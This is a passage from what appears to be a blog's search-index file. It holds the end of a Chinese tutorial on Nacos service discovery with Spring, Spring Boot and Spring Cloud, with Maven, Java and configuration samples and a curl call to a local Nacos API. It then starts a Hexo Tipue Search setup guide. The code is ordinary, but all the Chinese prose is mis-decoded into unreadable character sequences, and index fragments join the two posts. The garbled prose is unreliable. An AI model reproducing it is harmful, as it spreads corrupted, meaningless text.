Nacos Serverã€‚ç”±äºæ³¨å†Œçš„æœåŠ¡ä¸æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå› æ­¤æœåŠ¡æ³¨å†Œä¸€æ®µæ—¶é—´åï¼Œä¼šå›  Nacos Server çš„å¥åº·æ£€æŸ¥æœºåˆ¶è€Œè¢«å‰”é™¤å‡ºæœåŠ¡åˆ—è¡¨ 1$ curl -X PUT \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=example&amp;ip=127.0.0.1&amp;port=8080\' 1.7ã€æµ‹è¯•åº”ç”¨ç¨‹åº å°† Spring Web åº”ç”¨éƒ¨ç½²åˆ° Tomcat æœåŠ¡å™¨ æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/discovery/get?serviceName=exampleï¼Œè‹¥å“åº”ç»“æœå¦‚ä¸‹ï¼Œåˆ™è¯´æ˜ç¨‹åºè¿è¡Œæ­£å¸¸ 1234567891011121314151617181920[ { "instanceId": "127.0.0.1#8080#DEFAULT#DEFAULT_GROUP@@example", "ip": "127.0.0.1", "port": 8080, "weight": 1.0, "healthy": true, "enabled": true, "ephemeral": true, "clusterName": "DEFAULT", "serviceName": "DEFAULT_GROUP@@example", "metadata": { }, "instanceHeartBeatInterval": 5000, "instanceHeartBeatTimeOut": 15000, "ipDeleteTimeout": 30000, "instanceIdGenerator": "simple" }] Nacos Discovery Spring Boot å…¥é—¨æ¡ˆä¾‹2.0ã€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼ŒSpring Boot çš„ç‰ˆæœ¬ä¸º 2.0.3.RELEASEï¼Œå¯¹åº”çš„ Nacos Discovery Spring Boot çš„ç‰ˆæœ¬ä¸º 0.2.7ï¼ŒNacos Server çš„ç‰ˆæœ¬ä¸º 1.4.0ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 2.1ã€æ·»åŠ  Maven ä¾èµ–ç‰¹åˆ«æ³¨æ„ï¼ŒNacos Spring Boot Starter ç‰ˆæœ¬ 0.2.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 2.x ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ 0.1.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 1.x ç‰ˆæœ¬ã€‚ 12345678910111213141516171819202122232425&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;nacos-discovery-spring-boot.version&gt;0.2.7&lt;/nacos-discovery-spring-boot.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-discovery-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${nacos-discovery-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.2ã€åˆ›å»ºå¯åŠ¨ä¸»ç±»1234567@SpringBootApplicationpublic class NacosDiscoveryApplication { public static void main(String[] args) { SpringApplication.run(NacosDiscoveryApplication.class, args); }} 2.3ã€åˆ›å»º Controller æµ‹è¯•ç±»ä½¿ç”¨ @NacosInjected æ³¨å…¥ Nacos çš„ NamingService å®ä¾‹ï¼Œé€šè¿‡è¯¥å®ä¾‹è·å– Nacos Server çš„æœåŠ¡åˆ—è¡¨ 12345678910111213@Controller@RequestMapping("/discovery")public class DiscoveryController { @NacosInjected private NamingService namingService; @RequestMapping(value = "/get", method = RequestMethod.GET) @ResponseBody public List&lt;Instance&gt; get(@RequestParam(defaultValue = "") String serviceName) throws NacosException { return namingService.getAllInstances(serviceName); }} 2.4ã€é…ç½® application.propertiesåœ¨ application.properties ä¸­é…ç½® Nacos Server çš„åœ°å€ 1nacos.discovery.server-addr=127.0.0.1:8848 2.5ã€è°ƒç”¨ Nacos Open API æ³¨å†ŒæœåŠ¡è°ƒç”¨ Nacos Open API æ³¨å†Œä¸€ä¸ªåç§°ä¸º example çš„æœåŠ¡ï¼Œè¿™é‡Œæ¨¡æ‹Ÿäº†æœåŠ¡ç”Ÿäº§è€…è‡ªåŠ¨æ³¨å†ŒæœåŠ¡åˆ° Nacos Serverã€‚ç”±äºæ³¨å†Œçš„æœåŠ¡ä¸æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå› æ­¤æœåŠ¡æ³¨å†Œä¸€æ®µæ—¶é—´åï¼Œä¼šå›  Nacos Server çš„å¥åº·æ£€æŸ¥æœºåˆ¶è€Œè¢«å‰”é™¤å‡ºæœåŠ¡åˆ—è¡¨ 1$ curl -X PUT \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=example&amp;ip=127.0.0.1&amp;port=8080\' 2.6ã€æµ‹è¯•åº”ç”¨ç¨‹åº å¯åŠ¨ Spring Boot åº”ç”¨ æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/discovery/get?serviceName=exampleï¼Œè‹¥å“åº”ç»“æœå¦‚ä¸‹ï¼Œåˆ™è¯´æ˜ç¨‹åºè¿è¡Œæ­£å¸¸ 1234567891011121314151617181920[ { "instanceId": "127.0.0.1#8080#DEFAULT#DEFAULT_GROUP@@example", "ip": "127.0.0.1", "port": 8080, "weight": 1.0, "healthy": true, "enabled": true, "ephemeral": true, "clusterName": "DEFAULT", "serviceName": "DEFAULT_GROUP@@example", "metadata": { }, "instanceIdGenerator": "simple", "instanceHeartBeatInterval": 5000, "instanceHeartBeatTimeOut": 15000, "ipDeleteTimeout": 30000 }] Nacos Discovery Spring Cloud å…¥é—¨æ¡ˆä¾‹3.0ã€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼ŒSpring Cloud çš„ç‰ˆæœ¬æ˜¯ Greenwich.SR6ï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.1.18.RELEASEï¼Œå¯¹åº”çš„ Nacos Discovery Spring Cloud ç‰ˆæœ¬ä¸º 2.1.3.RELEASEï¼ŒNacos å®˜æ–¹ç‰ˆæœ¬è¯´æ˜å¯ä»¥çœ‹è¿™é‡Œï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 3.1ã€åˆ›å»º Maven çˆ¶å·¥ç¨‹åœ¨ Maven çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒNacos Spring Cloud Starter ç‰ˆæœ¬ 2.1.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 2.1.x ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ 2.0.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 2.0.x ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ 1.5.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 1.5.x ç‰ˆæœ¬ï¼ŒNacos å®˜æ–¹ç‰ˆæœ¬è¯´æ˜å¯ä»¥çœ‹è¿™é‡Œã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;nacos-discovery-spring-cloud.version&gt;2.1.3.RELEASE&lt;/nacos-discovery-spring-cloud.version&gt;&lt;/properties&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${nacos-discovery-spring-cloud.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 3.2ã€åˆ›å»º Provider Service å·¥ç¨‹åˆ›å»º Provider Service çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-alibaba-nacos-discovery ä¾èµ– 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ï¼Œå°†æœåŠ¡æ³¨å†Œåˆ° Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} åˆ›å»º Controller æµ‹è¯•ç±» 123456789@RestController@RequestMapping("/provider")public class ProviderController { @GetMapping("/call") public String call() { return "provider invoke"; }} åœ¨ application.properties ä¸­é…ç½® Nacos Server çš„åœ°å€ 12345678910server: port: 56011spring: application: name: provider-service cloud: nacos: discovery: server-addr: 127.0.0.1:8848 3.3ã€åˆ›å»º Consumer Service å·¥ç¨‹åˆ›å»º Consumer Service çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå¼•å…¥ spring-cloud-starter-alibaba-nacos-discovery ä¾èµ–ï¼Œç”±äºéœ€è¦é€šè¿‡ Feign Client è°ƒç”¨è¿œç¨‹æœåŠ¡ï¼Œå› æ­¤è¿˜éœ€è¦å¼•å…¥ spring-cloud-starter-openfeign ä¾èµ– 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ï¼Œå°†æœåŠ¡æ³¨å†Œåˆ° Nacos Serverï¼ŒåŒæ—¶æ·»åŠ  @EnableFeignClients æ³¨è§£æ¥å¯ç”¨ Feign Client 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} åˆ›å»ºæœåŠ¡æ¥å£ç±»ï¼Œç”¨äºè°ƒç”¨ Provider Service æš´éœ²çš„ API 1234567@FeignClient("provider-service")public interface ProviderClient { @GetMapping("/provider/call") public String call();} åˆ›å»º Controller æµ‹è¯•ç±»ï¼Œå› ä¸ºéœ€è¦åˆ›å»ºä¸€ä¸ª API æ¥ä¾›ç¬¬ä¸‰æ–¹è°ƒç”¨ Provider Service çš„é‚£ä¸ªè‡ªå®šä¹‰ API 12345678910111213@RestController@RequestMapping("/consumer")public class ConsumerController { @Autowired private ProviderClient providerClient; @GetMapping("/call") public String call() { return "consumer invoke | " + providerClient.call(); }} åœ¨ application.properties ä¸­é…ç½® Nacos Server çš„åœ°å€ 12345678910server: port: 56010spring: application: name: consumer-service cloud: nacos: discovery: server-addr: 127.0.0.1:8848 3.4ã€æµ‹è¯•åº”ç”¨ç¨‹åº 1ï¼‰åˆ†åˆ«å¯åŠ¨ nacos-provider-serviceã€nacos-consumer-service åº”ç”¨ 2ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:56011/provider/callï¼Œè‹¥å“åº”ç»“æœä¸º provider invokeï¼Œåˆ™è¯´æ˜ nacos-provider-service åº”ç”¨è¿è¡Œæ­£å¸¸ 3ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:56010/consumer/callï¼Œè‹¥å“åº”ç»“æœä¸º consumer invoke | provider invokeï¼Œåˆ™è¯´æ˜ nacos-consumer-service åº”ç”¨è¿è¡Œæ­£å¸¸ 4ï¼‰åœ¨ Nascos Server çš„æ§åˆ¶å°ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æœ‰ä¸¤ä¸ªæœåŠ¡æˆåŠŸæ³¨å†Œäº†ï¼Œå¦‚ä¸‹å›¾ï¼š 5ï¼‰è‹¥å¸Œæœ›æµ‹è¯•å¤šå®ä¾‹ï¼ˆProviderï¼‰çš„è´Ÿè½½å‡è¡¡è°ƒç”¨æƒ…å†µï¼Œå¯ä»¥ä¿®æ”¹ Provider Service å·¥ç¨‹ä¸‹çš„ application.properties é…ç½®æ–‡ä»¶é‡Œçš„ server.port å‚æ•°ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œç„¶åé€šè¿‡ -Dport=xxxxx VM å‚æ•°æŒ‡å®šä¸åŒçš„ç«¯å£æ¥å¯åŠ¨å¤šä¸ª Provider Service åº”ç”¨å³å¯ 12server: port: ${port:56011} è¡¥å……å†…å®¹Endpoint ä¿¡æ¯æŸ¥çœ‹Spring Boot æ”¯æŒè¿™ä¸€ç‚¹ï¼ŒNacos Discovery ä¹Ÿå¯ä»¥ä½¿ç”¨ Endpoint æ¥æš´éœ²ä¿¡æ¯ï¼Œå…ˆå†³æ¡ä»¶æ˜¯å°†ä¾èµ– spring-boot-starter-actuator æ·»åŠ åˆ° pom.xml æ–‡ä»¶ä¸­ï¼Œå¹¶é…ç½®ç«¯ç‚¹å®‰å…¨ç­–ç•¥ã€‚ Spring Boot 1.xï¼šæ·»åŠ é…ç½® management.security.enabled = false Spring Boot 2.xï¼šæ·»åŠ é…ç½® management.endpoints.web.exposure.include = * Spring Boot 1.xï¼šNacos Discovery ç«¯ç‚¹æŸ¥çœ‹çš„ URL æ˜¯ http://127.0.0.1:18083/nacos_discovery Spring Boot 2.xï¼šNacos Discovery ç«¯ç‚¹æŸ¥çœ‹çš„ URL æ˜¯ http://127.0.0.1:18083/actuator/nacos-discovery Nacos æœåŠ¡å‘ç°åŸç†æµ…ææœåŠ¡æ³¨å†Œ åœ¨ Spring åº”ç”¨ç¨‹åºçš„å¯åŠ¨é˜¶æ®µï¼Œå°†ç›‘è§† WebServerInitializedEvent äº‹ä»¶ã€‚åœ¨åˆå§‹åŒ– Web å®¹å™¨åæ”¶åˆ° WebServerInitializedEvent äº‹ä»¶æ—¶ï¼Œå°†è§¦å‘æ³¨å†Œæ“ä½œï¼Œå¹¶è°ƒç”¨ ServiceRegistry æ³¨å†Œæ–¹æ³•ä»¥å°†æœåŠ¡æ³¨å†Œåˆ° Nacos Serverã€‚ æœåŠ¡å‘ç° NacosServerList å®ç° com.netflix.loadbalancer.ServerList æ¥å£ï¼Œå¹¶åœ¨ @ConditionOnMissingBean ä¸‹è‡ªåŠ¨æ³¨å…¥å®ƒã€‚ Nacos æœåŠ¡å‘ç°å¸¸ç”¨é…ç½®è¯´æ˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Hexo æ·»åŠ ç«™å†…é™æ€æœç´¢ï¼ˆå…¨ç«™æœç´¢ï¼‰åŠŸèƒ½",url:"/posts/47b23c66.html",text:'å‰è¨€ç½‘ä¸Šå„ç§ Hexo ç«™å†…é™æ€æœç´¢ï¼ˆå…¨æ–‡æœç´¢ï¼‰æ–¹æ¡ˆï¼ŒåŸç†åŸºæœ¬éƒ½æ˜¯é€šè¿‡ Hexo æ’ä»¶åŠ¨æ€ç”Ÿæˆ JSON æ•°æ®æ–‡ä»¶ï¼Œç„¶ååŸºäº JSON æ•°æ®æ–‡ä»¶ï¼Œä½¿ç”¨ JS å¼€å‘ç®€å•çš„æœç´¢å¼•æ“ï¼Œä»¥æ­¤è¾¾åˆ°æœç´¢ç›®çš„ã€‚ç›®å‰ä¸»æµçš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨ NexT ä¸»é¢˜é›†æˆçš„ hexo-generator-searchdb æ’ä»¶ï¼Œå¯æƒœè¯¥æ–¹æ¡ˆçš„ UI ä»£ç å’Œ JS ä»£ç éƒ½ä¸¥é‡è€¦åˆäº† NexT ä¸»é¢˜ï¼Œå¯¹å…¶ä»– Hexo ä¸»é¢˜å¹¶ä¸å‹å¥½ã€‚ç”±äºç¬”è€…çš„åšå®¢ä½¿ç”¨çš„æ˜¯ Yilia ä¸»é¢˜ï¼Œå› æ­¤åªèƒ½å°è¯•å…¶ä»–æ›¿ä»£æ–¹æ¡ˆï¼Œæœ€ç»ˆå‘ç° Tipue Search é…åˆ hexo-tipue-search-db å®ç°çš„æœç´¢æ•ˆæœæŒºä¸é”™ã€‚Tipue Search æ˜¯ä¸€æ¬¾ JQuery æœç´¢æ’ä»¶ï¼Œæä¾›äº†åŸºç¡€çš„ UI ç•Œé¢ å’Œ JS æœç´¢å¼•æ“ï¼Œåªè¦æµè§ˆå™¨æ”¯æŒ JQuery å°±å¯ä»¥å¼€ç®±å³ç”¨ï¼Œè€Œä¸” UI æ ·å¼æ”¯æŒé«˜åº¦å®šåˆ¶ï¼Œéå¸¸é€‚åˆå¯¹æœç´¢ç•Œé¢æœ‰å¼ºè‡ªå®šä¹‰éœ€æ±‚çš„ä½¿ç”¨åœºæ™¯ã€‚è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢ä»‹ç»çš„ç«™å†…é™æ€æœç´¢æ–¹æ¡ˆéƒ½å­˜åœ¨å…±åŒçš„è‡´å‘½å¼±ç‚¹ï¼Œé‚£å°±æ˜¯å½“æ–‡ç« æ•°é‡æ¯”è¾ƒå¤šçš„æ—¶å€™ï¼ŒHexo æ’ä»¶åŠ¨æ€ç”Ÿæˆçš„æ•°æ®æ–‡ä»¶çš„ä½“ç§¯ä¼šå¾ˆå¤§ï¼ˆå•ä½ï¼šMBï¼‰ï¼Œå¯¼è‡´ç”¨æˆ·é¦–æ¬¡åŠ è½½æœç´¢ç•Œé¢æ—¶éå¸¸æ…¢ï¼›è€Œä¸”ç”±äºæµè§ˆå™¨ç¼“å­˜çš„ç¼˜æ•…ï¼Œä¸ä¸€å®šèƒ½å¤Ÿå®æ—¶æœç´¢åˆ°æœ€æ–°çš„æ–‡ç« å†…å®¹ã€‚æ­¤æ—¶è‹¥æƒ³ä»æ ¹æœ¬ä¸Šè§£å†³ä¸Šè¿°ç—›ç‚¹ï¼Œåªèƒ½å¼•å…¥åç«¯çš„æœç´¢å¼•æ“æŠ€æœ¯ï¼Œä¾‹å¦‚ Elasticsearchã€Solrã€Lucene ç­‰ï¼Œå¯è¿™åˆè¿èƒŒäº† Hexo æ‰“é€ é™æ€åšå®¢çš„åˆè¡·ã€‚é™„ä¸Šæœ¬ç«™ Tipue Search çš„æ¼”ç¤ºæ¡ˆä¾‹ã€‚ Hexo å®‰è£…æ’ä»¶æ’ä»¶å®‰è£… hexo-tipue-search-db æ’ä»¶ä¸»è¦ç”¨æ¥ç”Ÿæˆæœç´¢å¼•æ“éœ€è¦çš„ JS æ•°æ®æ–‡ä»¶ï¼ˆtipuesearch_content.jsï¼‰ï¼Œé»˜è®¤å­˜æ”¾çš„æ–‡ä»¶è·¯å¾„ä¸ºï¼š ${blog_root}/public/tipuesearch/tipuesearch_content.jsï¼Œè¯¥æ’ä»¶å…¼å®¹ Tipue Search 7.1 +ã€‚ 12345# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd ${blog_root}# å®‰è£…Hexoæ’ä»¶$ npm install hexo-tipue-search-db --save æ’ä»¶é…ç½®123tipue_search_db: exclude_page: false # Default posts and pages are included in generated db file, you can exclude pages by value true path: \'/tipuesearch/tipuesearch_content.js\' # Custom db file path, base on directory \'${blog_root}/public\' Tipue Search é…ç½®å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸‹é¢ä»‹ç»çš„é…ç½®å†…å®¹åŸåˆ™ä¸Šé€‚ç”¨äºä»»ä½• Hexo ä¸»é¢˜ï¼Œåªæ˜¯ä¸ªåˆ«é…ç½®ç»†èŠ‚ä¸åŒè€Œå·²ï¼Œç¬”è€…å·²éªŒè¯è¿‡å¯ä»¥é€‚ç”¨äº Yilia ä¸ NexT 8.x ä¸»é¢˜ã€‚ Tipue Search ä¸‹è½½æœ¬æ•™ç¨‹ä½¿ç”¨ Tipue Search 7.1ï¼Œä»æœ¬ç«™ä¸‹è½½ Tipue Search 7.1 çš„å‹ç¼©åŒ…å¹¶è§£å‹ã€‚ä»¥ Yilia ä¸»é¢˜ä¸ºä¾‹å­ï¼Œå°†è§£å‹åå¾—åˆ°çš„ tipuesearch æ–‡ä»¶å¤¹å¤åˆ¶åˆ° Yilia ä¸»é¢˜çš„ ${theme_dir}/source ç›®å½•ä¸‹ã€‚è‹¥ä½¿ç”¨çš„ Hexo ä¸»é¢˜æ˜¯ NexT 8.xï¼Œåˆ™å°†è§£å‹åå¾—åˆ°çš„ tipuesearch æ–‡ä»¶å¤¹å¤åˆ¶åˆ° NexT ä¸»é¢˜çš„ ${theme_dir}/source/lib ç›®å½•ä¸‹ã€‚ æ·»åŠ  HTML ä»£ç åˆ° HEAD æ ‡ç­¾å†…å°†ä»¥ä¸‹ä»£ç æ·»åŠ åˆ° Hexo ä¸»é¢˜çš„æ¨¡æ¿æ–‡ä»¶ä¸­çš„ HEAD æ ‡ç­¾å†…ï¼Œä»¥ Yilia ä¸»é¢˜ä¸ºä¾‹å­ï¼Œæ¨¡æ¿æ–‡ä»¶çš„è·¯å¾„å¯å‚è€ƒï¼š${theme_dir}/layout/_partial/head.ejs 1234567&lt;link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css"&gt;&lt;script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="tipuesearch/tipuesearch_content.js"&gt;&lt;/script&gt;&lt;link rel="stylesheet" href="tipuesearch/tipuesearch.css"&gt;&lt;script src="tipuesearch/tipuesearch_set.js"&gt;&lt;/script&gt;&lt;script src="tipuesearch/tipuesearch.min.js"&gt;&lt;/script&gt; æ·»åŠ æœç´¢æ¡†åˆ°æŒ‡å®šçš„ Web é¡µé¢åœ¨éœ€è¦ä½¿ç”¨æœç´¢æ¡†çš„ä»»æ„ UI æ¨¡æ¿ï¼ˆWeb é¡µé¢ï¼‰ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼Œæ ·å¼å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚é«˜åº¦è‡ªå®šä¹‰ 12345678910111213&lt;form&gt; &lt;div class="tipue_search_group"&gt; &lt;input type="text" name="q" id="tipue_search_input" pattern=".{3,}" title="At least 3 characters" autofocus="autofocus" required&gt;&lt;button type="submit" class="tipue_search_button"&gt;&lt;div class="tipue_search_icon"&gt;&amp;#9906;&lt;/div&gt;&lt;/button&gt; &lt;/div&gt;&lt;/form&gt;&lt;div id="tipue_search_content"&gt;&lt;/div&gt;&lt;script&gt; $(document).ready(function() { $(\'#tipue_search_input\').tipuesearch(); });&lt;/script&gt; æˆ–è€…æ·»åŠ åˆ° Hexo æ–°å»ºçš„æœç´¢é¡µé¢ä¸­ 12# é€šè¿‡Hexoçš„å‘½ä»¤æ–°å¢æœç´¢é¡µé¢$ hexo new page search æ·»åŠ  HTML5 çš„è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½è‹¥å¸Œæœ› Tipue Search çš„æœç´¢æ¡†ä½¿ç”¨ HTML5 çš„è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼Œåªéœ€åœ¨ input æ ‡ç­¾å†…æ·»åŠ  list å±æ€§å’Œåœ¨é¡µé¢ä¸­æ·»åŠ  datalist æ ‡ç­¾å³å¯ã€‚ç‰¹åˆ«æ³¨æ„ï¼šlist å±æ€§çš„å€¼å¿…é¡»ä¸ datalist æ ‡ç­¾çš„ ID å€¼ä¸€è‡´ã€‚ 12345678910111213&lt;form&gt; &lt;div class="tipue_search_group"&gt; &lt;input type="text" name="q" id="tipue_search_input" pattern=".{3,}" title="At least 3 characters" list="search" autocomplete="off" autofocus="autofocus" required&gt;&lt;button type="submit" class="tipue_search_button"&gt;&lt;div class="tipue_search_icon"&gt;&amp;#9906;&lt;/div&gt;&lt;/button&gt; &lt;/div&gt;&lt;/form&gt;&lt;datalist id="search"&gt; &lt;option&gt;jQuery&lt;/option&gt; &lt;option&gt;Support&lt;/option&gt; &lt;option&gt;Tipr&lt;/option&gt; &lt;option&gt;Tipue&lt;/option&gt; &lt;option&gt;Tipue Search&lt;/option&gt;&lt;/datalist&gt; Tipue Search å¸¸ç”¨å‚æ•°Tipue Search é»˜è®¤åªæ”¯æŒæœç´¢æ•´ä¸ªè‹±æ–‡å•è¯ï¼Œè‹¥æƒ³æ”¯æŒä¸­æ–‡æœç´¢ï¼Œå¿…é¡»è®¾ç½®å‚æ•°ï¼š \'wholeWords\': falseï¼Œå…¶ä»–å¸¸ç”¨å‚æ•°çš„è¯´æ˜å¦‚ä¸‹ï¼š 123456789$(\'#tipue_search_input\').tipuesearch({ \'show\': 10, // æ¯é¡µæ˜¾ç¤ºçš„æœ€å¤§æœç´¢è®°å½•æ•°ï¼Œé»˜è®¤å€¼ï¼š10 \'showURL\': false, // æ˜¯å¦å°†URLæ˜¾ç¤ºåœ¨æ¯ä¸ªæœç´¢ç»“æœä¸­ï¼Œé»˜è®¤å€¼ï¼štrue \'newWindow\': true, // ç‚¹å‡»æœç´¢ç»“æœæ—¶æ˜¯å¦åœ¨æ–°çš„æµè§ˆå™¨é€‰é¡¹å¡ä¸­æ‰“å¼€é¡µé¢ï¼Œé»˜è®¤å€¼ï¼šfalse \'footerPages\': 10, // é¡µè„šä¸­æ˜¾ç¤ºçš„æœ€å¤§é¡µé¢é€‰æ‹©æ•°ï¼Œé»˜è®¤å€¼ï¼š3 \'minimumLength\': 3, // æœç´¢å…³é”®å­—ä¸­æœ€å°çš„å­—ç¬¦é•¿åº¦ï¼Œé»˜è®¤å€¼ï¼š3 \'wholeWords\': false, // æ˜¯å¦ä¸ä½¿ç”¨è‹±è¯­ä»¥å¤–çš„å…¶ä»–è¯­è¨€ï¼Œé»˜è®¤å€¼ï¼štrue \'showTitleCount\': false // æ˜¯å¦å°†æœç´¢ç»“æœçš„æ•°é‡æ˜¾ç¤ºåœ¨æµè§ˆå™¨é€‰é¡¹å¡çš„æ ‡é¢˜ä¸­ï¼Œé»˜è®¤å€¼ï¼štrue }); Tipue Search çš„ç‰¹æ€§ Tipue Search 7.1 ä¾èµ– JQuery-2.2.4ï¼Œå®˜æ–¹æ¨èä½¿ç”¨ JQuery-3.xï¼Œå®æµ‹ä½¿ç”¨ä½ç‰ˆæœ¬çš„ JQuery-1.11.0 ä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œ Tipue Search ä¸åŒç‰ˆæœ¬ä¹‹é—´æœ€æœ¬è´¨çš„åŒºåˆ«æ˜¯ï¼šæ–°ç‰ˆçš„æ•°æ®æ–‡ä»¶æ˜¯ JS æ–‡ä»¶ï¼Œæ—§ç‰ˆçš„æ•°æ®æ–‡ä»¶æ˜¯ JSON æ–‡ä»¶ï¼Œä¸¤è€…äº’ä¸å…¼å®¹ Tipue Search 